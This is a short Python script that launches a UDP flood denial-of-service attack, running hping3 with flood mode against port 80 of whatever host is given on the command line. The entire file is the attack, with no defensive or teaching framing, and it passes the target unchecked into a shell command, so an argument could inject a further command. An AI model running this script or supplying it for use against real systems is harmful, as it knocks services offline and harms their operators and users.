import os
import sys

target = sys.argv[1]

print("Starting UDP flood")

os.system(
    f"hping3 --udp --flood -p 80 {target}"
)